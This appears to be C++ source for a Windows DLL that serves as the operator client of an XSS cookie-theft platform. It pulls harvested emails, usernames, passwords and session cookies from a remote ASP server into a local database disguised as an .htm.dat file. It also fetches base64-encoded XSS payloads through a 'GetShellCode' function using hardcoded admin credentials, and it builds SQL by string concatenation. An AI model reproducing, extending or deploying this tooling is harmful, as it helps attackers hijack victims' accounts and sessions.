// webdata.cpp : Defines the entry point for the DLL application.
//
//define WEBDATA_EXPORTS
#include "stdafx.h"
#include "webdata.h"


#ifdef _DEBUG
#define new DEBUG_NEW //����ڴ�й¶
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
    switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
    }
    return TRUE;
}



// This is the constructor of a class that has been exported.
// see webdata.h for the class definition
CWebData::CWebData()
{ 
	return; 
}

CWebData::~CWebData()
{ 
	m_strArecv.Empty();
	strxml.Empty();
	return; 
}

int CWebData::login(const CString strSerURL,const CString strLogname,const CString strPassword)
{

	CString strTemp;
	m_strSerURL=strSerURL;//����URL
	strTemp.Format(_T( "%slogin.asp?username=%s&password=%s"),strSerURL,strLogname,strPassword);
	SendURL(strTemp,1);
	m_strArecv=m_strArecv.Right(10); //��ȡ�û�ID,3��ȡ��admin��ID
	int len=m_strArecv.GetLength();
	int n=m_strArecv.Find(':');
	m_strArecv=m_strArecv.Right(len-n-1);
	int nlogID=atoi(m_strArecv);
	if(nlogID<0)
	{
		AfxMessageBox(_T("��¼ʧ�ܣ�"));
//		logout();
//		logID=0;
		return 0;
	}
	else
	{
		return nlogID;
	}
}

void CWebData::SendURL(CString strurl,bool brecv) //����ASP���󣬲���ʾ��ȡ������
{
	CInternetSession mySession(NULL,0);
	CHttpFile* myHttpFile=NULL;
	CString strline;
	CStringA stra;

	strxml.Empty();
	m_strArecv.Empty();
	myHttpFile=(CHttpFile*)mySession.OpenURL(strurl);
	//CString s1=_T("\r\n");
	while(myHttpFile->ReadString(strline))//��ȡһ��
	{

		strline.TrimRight();
		char * cs=(char  *)strline.GetBuffer(strline.GetLength());


		char * rn="\r\n";
		strline.ReleaseBuffer();
		stra.Format("%s%s",cs,rn);
		m_strArecv+=stra;

	}
	
	//д�뵽�ļ�
	strxml=m_strArecv;//����һ��
	myHttpFile->Close() ;
	mySession.Close() ;
	delete myHttpFile;
	if(!brecv) //����Ҫ����
	{	
//		m_strArecv.Empty();
//		GetDlgItem(IDC_EDWEBSOURCE)->SetWindowText(strxml);
	}

}

//Ӧ����ָ��������õķ�������
bool CWebData::ReadXML(TCHAR * path,TCHAR * title[15],int len,TCHAR * rss,CListCtrl &m_list)
{
	int nCount = m_list.GetItemCount(); //���֮ǰ����Ϣ

	for (int n=0;n < nCount;n++)
	{
		m_list.DeleteItem(0);
	}

	m_list.DeleteAllItems();

	while ( m_list.DeleteColumn (0));//ɾ�����е���


	m_list.SetExtendedStyle(LVS_EX_GRIDLINES); //������չ���������
	for (int tit=0;tit<len;tit++)
	{
		m_list.InsertColumn(tit,(LPCTSTR)title[tit],LVCFMT_CENTER,70);
	}
	
    unsigned short buff[128];
    memset(buff,0,128);   

	MSXML::IXMLDOMDocumentPtr xdoc; //
	xdoc.CreateInstance(__uuidof(MSXML::DOMDocument));
//	xdoc->load(path);
	xdoc->loadXML((char *)strxml.GetBuffer(strxml.GetLength()));
	MSXML::IXMLDOMNodeListPtr nodelist=NULL; //��þ���ӵ��ֵ
	nodelist=xdoc->selectNodes(rss);//��ȡ�ڵ�·��
	MSXML::IXMLDOMNodePtr subnode;//�ڵ��ָ�����
	long nodecount;
	nodelist->get_length(&nodecount);
	if(!nodecount)
	{
		AfxMessageBox(_T("��ȡ�����ļ�������û������Ϣ��")); //��Ϊ��
		return 0;
	}
	for(int tit=0;tit<len;tit++) //��
	{	
		for(long i=0;i<nodecount;i++) //��
		{
			if(tit==0) 	m_list.InsertItem(i,_T("")); //����0��ʱ��Ҫ����һ��
			subnode=nodelist->nextNode()->selectSingleNode((_bstr_t)title[tit]);//��ýڵ��ָ�����
			_bstr_t bstrname=subnode->Gettext();//�������		
			m_list.SetItemText(i,tit,bstrname);
		}
		nodelist->reset(); 
	}

	return 1;
}

void CWebData::logout(const CString strSerURL,int nlogID)
{
//	GetDlgItem(IDC_EDADDRESS)->GetWindowText(url);
	CString strURLtemp;
	strURLtemp.Format(_T( "%slogout.asp?userID=%d"),strSerURL,nlogID);
	SendURL(strURLtemp,1);

}

void CWebData::CreateXML(TCHAR *path)
{

	CFile file ((LPCTSTR)path,CFile::modeCreate|CFile::modeWrite);
	file.Write(strxml,strxml.GetLength());
	file.Close();
}

void CWebData::SendSql(CString SQL) 
{

	CInternetSession mySession(NULL,0);
	CHttpFile* myHttpFile=NULL;
	CString str1,strline;
	CStringA strsource;

	str1.Format(_T( "%s/sql.asp?sql=%s"),m_strSerURL,SQL );
	myHttpFile=(CHttpFile*)mySession.OpenURL(str1);

	while(myHttpFile->ReadString(strline))//��ȡһ��
	{
		strsource+=strline;
		strsource+="\r\n";
	}
	//д�뵽�ļ�
	strxml=strsource;//����һ��
	myHttpFile->Close();
	mySession.Close();
}


bool CWebData::WebUpToMDB()
{
	//	MessageBoxA(NULL,"ȫ������Ҫ��ձ������ݿ⣿",MB_OKCANCEL);
	if(AfxMessageBox(_T("������������ձ������ݿ�"), NULL, MB_OKCANCEL)==IDOK)
	{

		if(!LoadXML())
		{
			AfxMessageBox(_T("�������ݳ���"));
			return 0;
		}
		CADOWeb m_cADOwebConn;

		CString sql;
		sql.Format(_T("select * from infcook"));
		m_cADOwebConn.m_pRecordset = m_cADOwebConn.GetRecordSet((_bstr_t)sql);
		if(!m_cADOwebConn.m_pRecordset->adoEOF)
		{
			sql.Format(_T("delete * from infcook"));
			m_cADOwebConn.ExecuteSQL((_bstr_t)sql);
		}
		m_cADOwebConn.ExitConnect();
	}

	TCHAR * path; //xml�ļ�����
	TCHAR * rss;//xml�ṹ

	TCHAR * form; //���ݿ����
	int listnub;

	/////////////////////////////////////////////user.xml
	path=_T("infcook.dat"); //xml�ļ�����
	rss = _T("rss/channel/item");//xml�ṹ

	form = _T("infcook"); //���ݿ����			

	TCHAR *title[8] = //�ֶ�
	{
		{_T("webID")},
		{_T("userID")},
		{_T("taskID")},
		{_T("email")},
		{_T("username")},	//
		{_T("password")},
		{_T("urlh")},  //���׵��´���
		{_T("cookies")}
//		{_T("date")}
	};
	
	listnub=sizeof(title)/4;   //�ֶθ���
	if(!WriteXMLtoMDB(path,rss,form,title,listnub))
	{
		AfxMessageBox(_T("�洢����infcook.xml"));
		return 0;
	}


	AfxMessageBox(_T("���������ɣ�"));
	return 1;
	
}

bool CWebData::WriteXMLtoMDB(TCHAR *path, TCHAR *rss, TCHAR *form,TCHAR * title[15],int listnub)
{

	///////////////////////////////////////////
	//����XML

	unsigned short buff[128];
    memset(buff,0,128);   

	MSXML::IXMLDOMDocumentPtr xdoc; //
	xdoc.CreateInstance(__uuidof(MSXML::DOMDocument));
//	xdoc->load(path);
	xdoc->loadXML((char *)strxml.GetBuffer(strxml.GetLength()));
	MSXML::IXMLDOMNodeListPtr nodelist=NULL; //��þ���ӵ��ֵ
	nodelist=xdoc->selectNodes(rss);//��ȡ�ڵ�·��
	MSXML::IXMLDOMNodePtr subnode;//�ڵ��ָ�����
	long nodecount;
	nodelist->get_length(&nodecount);  //cookies��Ϣ̫���������޷���ȡ��ȷ��nodelistֵ
	if(!nodecount)
	{
		AfxMessageBox(_T("��ȡ�����ļ�����")); //��Ϊ��
		return 0;
	}
//	_bstr_t bstrmdb[50][50];//����������
	//���Ի����ݿ�洢��
	_bstr_t sql;

	int intID=0;	//��ȡ���ڵ��������intIDֵ
//��д��һ������¼�µ�һ�������е�intID,������ڶ��е�ʱ��
//
				
	for(int tit=0;tit<listnub;tit++) //--->
	{
		int n=intID;
		for(long i=0;i<nodecount;i++) //����
		{
			if(tit==0&&i<=1) //д���һ��֮��i=0��ʱ��ȡ����
			{
				sql="select top 1 ID from "+(_bstr_t)form+" ORDER BY ID DESC"; //TOP���ϣ�ORDER BY ID DESC С����
				m_cADOweb.m_pRecordset = m_cADOweb.GetRecordSet(sql);
				if(!m_cADOweb.m_pRecordset->adoEOF)
				{
					_bstr_t  bstrID;
	//				int intID = (int)m_cADOweb.m_pRecordset->GetCollect("ID");  ��δ�����VS2005������
					bstrID=(_bstr_t)m_cADOweb.m_pRecordset->GetCollect("ID");
					CString strID=(wchar_t*)bstrID;
					if(nodecount==1)
					{
						TCHAR * buffer = strID.GetBuffer(strID.GetLength());
						intID=_ttoi(buffer)+1;//ֻ���һ�����ݵ�ʱ��
					}
					else
					{
						TCHAR * buffer = strID.GetBuffer(strID.GetLength());
						intID=_ttoi(buffer);
					}

				}
				else
				{
		//			AfxMessageBox("ID������ȷ�ϱ���û�д�"); //��Ϊ��
					intID=0;
		//			return 0;
				}
			}
			
			subnode=nodelist->nextNode()->selectSingleNode((_bstr_t)title[tit]);//��ýڵ��ָ�����
			_bstr_t bstrname=subnode->Gettext();//�������xml
			if(bstrname==(_bstr_t)"") bstrname="0";
		//	bstrmdb[tit][i]=bstrname;			
			if(tit<1) //�����һ��
			{
				sql="INSERT INTO "+(_bstr_t)form+" ("+(_bstr_t)title[tit]+") VALUES('"+ bstrname +"')";
			}
			else 
			{				
				CString temp;
				temp.Format(_T("%d"),n);
				sql="UPDATE "+(_bstr_t)form+" SET "+(_bstr_t)title[tit]+" = '"+ bstrname + "' WHERE ID = "+(_bstr_t)temp;
				n++;
			}
	//			AfxMessageBox(sql);
			m_cADOweb.ExecuteSQL(sql);			
		}		
		nodelist->reset(); 
	}
					
	m_cADOweb.ExitConnect();
	return 1;
}

bool CWebData::LoadXML(int startID)  //����ȫ�����������
{

	CString strurl;
	strurl.Format(_T( "%s/creatxml.asp?form=infcook"),m_strSerURL );//�����µ�XML�ļ�

	SendURL(strurl,0); //����Ҫ����

	
//	TCHAR * path = _T("infcook.dat");
//	CreateXML(path);


	AfxMessageBox(_T("����������ɣ�"));

	return 1;



}

bool CWebData::GetNews(bool bload) //��������XML�������¸��µ����ݿ�,bloadΪ1����������
{
		//////////////////////
	//	TCHAR * cook;
		TCHAR * path;
		TCHAR * rss;
		TCHAR * form;
		int listnub;
		CString strurl;
		if(bload==0)
		{
			//		bload = 1;
			strurl.Format(_T("%s/new.asp?download=%d"),m_strSerURL,bload );//�����µ�XML�ļ�
			//		AfxMessageBox(strurl);

			SendURL(strurl,1); //��Ҫ����,ȡ������Ϣ����
			m_strArecv=m_strArecv.Right(10); //��ȡ�û�ID,3��ȡ��admin��ID
			int len=m_strArecv.GetLength();
			int n=m_strArecv.Find(':');
			m_strArecv=m_strArecv.Right(len-n-1);
		//	TCHAR * buffer = m_strArecv.GetBuffer(m_strArecv.GetLength());
		//	news=_ttoi(buffer);
			m_nNews=atoi(m_strArecv);
		}

		else if(bload==1&&m_nNews>0)
		{		
			strurl.Format(_T( "%s/new.asp?download=%d"),m_strSerURL,bload);//��ȡ�µ�XML�ļ�
			SendURL(strurl,1); //����ʾ��״̬��

			path = _T("newinfcook.dat");
			CreateXML(path);


			/////////////////////////////////////////////cook.xml
			path=_T("newinfcook.dat"); //xml�ļ�����
			rss = _T("rss/channel/item");//xml�ṹ

			form = _T("infcook"); //���ݿ����			

			TCHAR *titlecook[8] = //�ֶ�
			{
				{_T("webID")},
				{_T("userID")},
				{_T("taskID")},
				{_T("email")},
				{_T("username")},	//
				{_T("password")},
				{_T("urlh")},
				{_T("cookies")}
			};

			listnub=sizeof(titlecook)/4;   //�ֶθ���
			if(!WriteXMLtoMDB(path,rss,form,titlecook,listnub))
			{
				AfxMessageBox(_T("COOK�洢����infcook.xml"));
				return false;
			}
				AfxMessageBox(_T("���ݸ�����ɣ�"));
				return 1;
		}
		
		//AfxMessageBox(_T("û������Ϣ��"));
		return 0;

}

  //���ڴ���xml��ʽ���ִ���������
bool CWebData::viewinf(CListCtrl &m_list) 
{
	
	
	////////////////////////  inf  /////////////////////////////
	CString strurl;
	strurl.Format(_T( "%s/creatxml.asp?form=inf"),m_strSerURL );//�����µ�XML�ļ�
	
	SendURL(strurl,0); //����Ҫ����
//	strurl.Format(_T( "%s/%dinf.xml"),m_strSerURL,logID);//��ȡ�µ�XML�ļ�
//	SendURL(strurl,1); //����ʾ��״̬��
	
	TCHAR * path = _T("inf.dat");
//	CreateXML(path);
	
	////////////////////////////////////
	
	TCHAR *countitl[5] = //��xml�ı�ǩ��ֵ���������
	{
		{_T("userID")},	//Ҫ�ǻ���XML�ļ�������һ���������������
	//	{_T("taskID")},
		{_T("email")},
		{_T("username")},
		{_T("password")},
		{_T("webID")}
	};
	
	int listnub=sizeof(countitl)/4;
	path=_T("inf.dat");
	TCHAR * rss = _T("rss/channel/item");
	ReadXML(path,countitl,listnub,rss,m_list);
	return 1;//Ҫ��ȡ����������ݣ�����

////////////////////// user  /////////////////////////////


}

bool CWebData::viewcook(CListCtrl &m_list,const int nLogID)
{
	CString strurl;
	strurl.Format(_T("%s/creatxml.asp?form=cook"),m_strSerURL );
	SendURL(strurl,1);
//	strurl.Format( _T("%s/%dcook.xml"),m_strSerURL,logID);
//	SendURL(strurl,0);

	TCHAR * path = _T("cook.dat");
//	CreateXML(path);
		
	TCHAR *cooktitl[2] = //��xml�ı�ǩ��ֵ���������
	{
		{_T("userID")},	//Ҫ�ǻ���XML�ļ�������һ���������������
	//	{_T("taskID")},
		{_T("urlh")},
	//	{_T("cookies")},
	};
	
	int listnub=sizeof(cooktitl)/4;
	path=_T("cook.dat");
	TCHAR * rss = _T("rss/channel/item");
//	::ShellExecute(NULL,"open","notepad.exe","cook.xml",NULL,SW_SHOW);
	ReadXML(path,cooktitl,listnub,rss,m_list);
	return 1;

}

bool CWebData::viewuser(CListCtrl &m_list,const int nLogID)
{
	CString strurl;
	strurl.Format(_T("%s/creatxml.asp?form=user"),m_strSerURL );//�����µ�XML�ļ�
	SendURL(strurl,0); //����Ҫ����
	strurl.Format(_T("%s/%duser.xml"),m_strSerURL,nLogID);//��ȡ�µ�XML�ļ�
	SendURL(strurl,0); //����ʾ��״̬��
	
	TCHAR * path = _T("user.dat");
	CreateXML(path);
	
	////////////////////////////////////
	
	TCHAR *countitl[3] = //��xml�ı�ǩ��ֵ���������
	{
		{_T("username")},	//Ҫ�ǻ���XML�ļ�������һ���������������
		{_T("userpass")},
		{_T("quanxian")},
	};
	
	int listnub=sizeof(countitl)/4;
	path=_T("user.dat");
	TCHAR * rss = _T("rss/channel/item");
	ReadXML(path,countitl,listnub,rss,m_list);
	return 1;
}

bool CWebData::viewjsweb(CListCtrl &m_list,const int nLogID)
{
	//////////////////
	CString strurl;
	strurl.Format(_T("%s/creatxml.asp?form=jsweb"),m_strSerURL );//�����µ�XML�ļ�
	SendURL(strurl,0); //����Ҫ����
	strurl.Format(_T("%s/%djsweb.xml"),m_strSerURL,nLogID);//��ȡ�µ�XML�ļ�
	SendURL(strurl,0); //����ʾ��״̬��
	
	TCHAR * path = _T("jsweb.dat");
	CreateXML(path);
	
	////////////////////////////////////
	
	TCHAR *countitl[3] = //��xml�ı�ǩ��ֵ���������
	{
		{_T("email")},	//Ҫ�ǻ���XML�ļ�������һ���������������
		{_T("jsurl")},
		{_T("m_strSerURL")},
	};
	
	int listnub=sizeof(countitl)/4;
	path=_T("jsweb.dat");
	TCHAR * rss = _T("rss/channel/item");
	ReadXML(path,countitl,listnub,rss,m_list);

	return 1;
}



bool CWebData::delID(TCHAR *form, int ID)
{

	CString strurl;
	strurl.Format(_T( "%s/delID.asp?form=%s&webID=%d"),m_strSerURL,form,ID);//��ȡ�µ�XML�ļ�
//	AfxMessageBox(strurl);
	SendURL(strurl,0); //����ʾ��״̬��
	return 1;
}


CStringA CWebData::GetShellCode(const int nTaskID,const TCHAR * pName,const TCHAR * pMailStyle,const int nGetCodeStyle)
{

	//���ͻ�ȡshellcode����
	CString strurl;
//	TCHAR*tmail=_T("163.com");
	CString m_email=pName;//+pMailStyle;
	CString Style=pMailStyle;
	m_email=m_email+_T("@")+Style;
	strurl.Format(_T( "%sCode.asp?s_mail=%s&UserName=%s&PassWord=%s&nTask=%d&nHKStyle=%d"),m_strSerURL,m_email,_T("admin"),_T("admin"),nTaskID,nGetCodeStyle);//��ȡ�µ�XML�ļ�
//	AfxMessageBox(strurl);
	SendURL(strurl,1); //����ʾ��״̬��
	
	string str1(m_strArecv.GetString());

	//string str1 = cstr1.GetBuffer(cstr1.GetLength());
//	MessageBox((LPCTSTR)str1.c_str());
	string str2 = Base64::base64_decode(str1);
//	MessageBox((LPCTSTR)str2.c_str());
	CStringA STR_XSS;
//	STR_XSS=str2;
	STR_XSS.Format("%s",str2.c_str());
	return STR_XSS;
}


bool CWebData::viewinfformMDB(CListCtrl &m_list,const int nLogID)
{
	int nCount = m_list.GetItemCount(); //���֮ǰ����Ϣ

	for (int n=0;n < nCount;n++)
	{
		m_list.DeleteItem(0);
	}
	m_list.DeleteAllItems();
	while ( m_list.DeleteColumn (0));//ɾ�����е���
	TCHAR *countitl[6] = //��xml�ı�ǩ��ֵ���������
	{
		{_T("webID")},
		{_T("userID")},	//Ҫ�ǻ���XML�ļ�������һ���������������
		{_T("taskID")},
		{_T("email")},
		{_T("username")},
		{_T("password")}
		
	};
	int listnub=sizeof(countitl)/4;
	m_list.SetExtendedStyle(LVS_EX_GRIDLINES); //������չ���������
	for (int tit=0;tit<listnub;tit++)
	{
		m_list.InsertColumn(tit,(LPCTSTR)countitl[tit],LVCFMT_CENTER,70);
	}


	CADOWeb m_cADOwebConn;
	if(!m_cADOwebConn.OnInitADOConnect())
		return 0;
		CString sql;
		int i = 0;
		sql.Format(_T("select  * from infcook order by webID DESC")); //ASC Ĭ�ϣ�DESC��С
		m_cADOwebConn.m_pRecordset = m_cADOwebConn.GetRecordSet((_bstr_t)sql);
		while(!m_cADOwebConn.m_pRecordset->adoEOF)
		{
			m_list.InsertItem(i,_T("")); //������ݿ����п���ô�죿
			m_list.SetItemText(i,0,(LPCTSTR)(_bstr_t)m_cADOwebConn.m_pRecordset->GetCollect("webID"));
			m_list.SetItemText(i,1,(LPCTSTR)(_bstr_t)m_cADOwebConn.m_pRecordset->GetCollect("userID"));
			m_list.SetItemText(i,2,(LPCTSTR)(_bstr_t)m_cADOwebConn.m_pRecordset->GetCollect("taskID"));
			m_list.SetItemText(i,3,(LPCTSTR)(_bstr_t)m_cADOwebConn.m_pRecordset->GetCollect("email"));
			m_list.SetItemText(i,4,(LPCTSTR)(_bstr_t)m_cADOwebConn.m_pRecordset->GetCollect("username"));
			m_list.SetItemText(i,5,(LPCTSTR)(_bstr_t)m_cADOwebConn.m_pRecordset->GetCollect("password"));
			m_cADOwebConn.m_pRecordset->MoveNext();
			i++;
		}
		m_cADOwebConn.ExitConnect();
		return true;
}

bool CWebData::viewcookformMDB(CListCtrl &m_list,const int nLogID)
{
	int nCount = m_list.GetItemCount(); //���֮ǰ����Ϣ

	for (int n=0;n < nCount;n++)
	{
		m_list.DeleteItem(0);
	}

	m_list.DeleteAllItems();

	while ( m_list.DeleteColumn (0));//ɾ�����е���

	TCHAR *cooktitl[4] = //��xml�ı�ǩ��ֵ���������
	{
		{_T("webID")},
		{_T("userID")},	//Ҫ�ǻ���XML�ļ�������һ���������������
		{_T("taskID")},
		{_T("urlh")},
	};
	
	int listnub=sizeof(cooktitl)/4;
	m_list.SetExtendedStyle(LVS_EX_GRIDLINES); //������չ���������
	for (int tit=0;tit<listnub;tit++)
	{
		m_list.InsertColumn(tit,(LPCTSTR)cooktitl[tit],LVCFMT_CENTER,70);
	}
	CADOWeb m_cADOwebConn;
	if(!m_cADOwebConn.OnInitADOConnect())
		return 0;
	
		CString sql;
		int i = 0;
		sql.Format(_T("select  * from infcook order by webID DESC")); //ASC Ĭ�ϣ�DESC��С
		m_cADOwebConn.m_pRecordset = m_cADOwebConn.GetRecordSet((_bstr_t)sql);
		while(!m_cADOwebConn.m_pRecordset->adoEOF)
		{
			m_list.InsertItem(i,_T("")); //������ݿ����п���ô�죿
			m_list.SetItemText(i,0,(LPCTSTR)(_bstr_t)m_cADOwebConn.m_pRecordset->GetCollect("webID"));
			m_list.SetItemText(i,1,(LPCTSTR)(_bstr_t)m_cADOwebConn.m_pRecordset->GetCollect("userID"));
			m_list.SetItemText(i,2,(LPCTSTR)(_bstr_t)m_cADOwebConn.m_pRecordset->GetCollect("taskID"));
			m_list.SetItemText(i,3,(LPCTSTR)(_bstr_t)m_cADOwebConn.m_pRecordset->GetCollect("urlh"));
			//		m_list.SetItemText(i,4,(char*)(_bstr_t)m_cADOwebConn.m_pRecordset->GetCollect("date"));
			//		m_list.SetItemText(i,3,(char*)(_bstr_t)m_cADOwebConn.m_pRecordset->GetCollect("cookies"));
			m_cADOwebConn.m_pRecordset->MoveNext();
			i++;
		}
	   m_cADOwebConn.ExitConnect();
	return true;
}

std::string Base64::base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len) {
    std::string ret;
    int i = 0;
    int j = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];
    /*��ÿ����8Bit���ֽ�ת��Ϊ�ĸ�6Bit���ֽڣ�3*8 = 4*6 = 24����Ȼ���6Bit������λ��λ0������ĸ�8Bit���ֽ�*/
    while (in_len--) {
        char_array_3[i++] = *(bytes_to_encode++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2; //��λ�����㣬* 0xfc=11111100 ���ĩ��λ������������λ
			//0x03=000011ȡĩ��λ��������λ������3[1]��ǰ��λ��0xf0=11110000
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
			//0x0f=00001111ȥ3[1]�ĺ���λ��������λ������3[2]�������Ϊ oxc0=110000
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
			//0x3f=00111111 ȡ�ұ���λ
            char_array_4[3] = char_array_3[2] & 0x3f;
            
            for(i = 0; (i <4) ; i++)
                ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }
    
    if (i)
    {
        for(j = i; j < 3; j++)
            char_array_3[j] = '0';
        
        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;
        
        for (j = 0; (j < i + 1); j++)
            ret += base64_chars[char_array_4[j]];
        
        while((i++ < 3))
            ret += '=';
        
    }
    
    return ret;
}

std::string Base64::base64_decode(std::string const& encoded_string) {
    int in_len = encoded_string.size();
    int i = 0;
    int j = 0;
    int in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];
    std::string ret;
    
    while (in_len-- && ( encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
        char_array_4[i++] = encoded_string[in_]; in_++;
        if (i ==4) {
            for (i = 0; i <4; i++)
                char_array_4[i] = base64_chars.find(char_array_4[i]);
            
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
            
            for (i = 0; (i < 3); i++)
                ret += char_array_3[i];
            i = 0;
        }
    }
    
    if (i) {
        for (j = i; j <4; j++)
            char_array_4[j] = 0;
        
        for (j = 0; j <4; j++)
            char_array_4[j] = base64_chars.find(char_array_4[j]);
        
        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
        
        for (j = 0; (j < i - 1); j++) ret += char_array_3[j];
    }
    
    return ret;
}


			// MFC support for Windows Common Controls



//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CADOWeb::CADOWeb()
{

}

CADOWeb::~CADOWeb()
{
	::CoUninitialize();
}


bool CADOWeb::OnInitADOConnect() //��ʼ������
{
	//��ʼ��OLE/COM�⻷��
	//��ʼ��OLE/COM�⻷��
	TCHAR *mdbpath;
	TCHAR	inipath[MAX_PATH];

	ZeroMemory( inipath ,MAX_PATH*sizeof(TCHAR));
	GetModuleFileName(NULL, inipath, MAX_PATH);
	//GetCurrentDirectory(MAX_PATH,inipath);  //�ҵ���ǰ���̵ĵ�ǰĿ¼
	TCHAR *pFind = _tcsrchr(inipath, _T('\\'));
	if ( pFind != NULL)
	{
		lstrcpy(pFind, _T("\\"));
	}

	lstrcat(inipath,_T("#mage_men_stars1.htm.dat"));
	mdbpath = inipath;

//	mdbpath="#mage_men_stars1.htm.mdb";
    ::CoInitialize(NULL);
	try
	{
		//����connection����
		m_pConnection.CreateInstance("ADODB.Connection");	   
		//���������ַ���
		_bstr_t strConnect="uid=;pwd=;DRIVER={Microsoft Access Driver (*.mdb)};DBQ="+(_bstr_t)mdbpath+";";
		//SERVER��UID,PWD�����ø���ʵ�����������
		m_pConnection->Open(strConnect,"","",adModeUnknown);
		return true;
	}

	//��׽�쳣
	catch(_com_error e)
	{   //��ʾ������Ϣ
//		AfxMessageBox(e.Description());
		AfxMessageBox(_T("���ݿ����ӳ���"));
		return false;
	
	}

}

_RecordsetPtr& CADOWeb::GetRecordSet(_bstr_t bstrSQL) //SQL���� 
{
	try
	{
		m_pConnection==NULL;
			OnInitADOConnect();
			
				//������¼������
				//		m_pRecordset->CreateInstance; //��¼������ָ�����
				m_pRecordset.CreateInstance(__uuidof(Recordset));
				m_pRecordset->Open(bstrSQL,m_pConnection.GetInterfacePtr(), //ֱ���ü�¼�������ѯ
				adOpenDynamic,adLockOptimistic,adCmdText);
				
			
	}
	catch(_com_error e)
	{
		AfxMessageBox(e.Description());
	}
	return m_pRecordset;
}

bool CADOWeb::ExecuteSQL(_bstr_t bstrSQL) //�޼�¼������ִ��SQL����
{
	try
	{
		if(m_pConnection==NULL)
			OnInitADOConnect();
			
				m_pConnection->Execute(bstrSQL,NULL,adCmdText);
				return true;
			
	}

	catch(_com_error e)
	{
		AfxMessageBox(e.Description());
		return false;
	}

}

void CADOWeb::ExitConnect() //�Ͽ�����
{
	if(m_pRecordset!=NULL)
		m_pRecordset->Close();
	m_pConnection->Close();

}


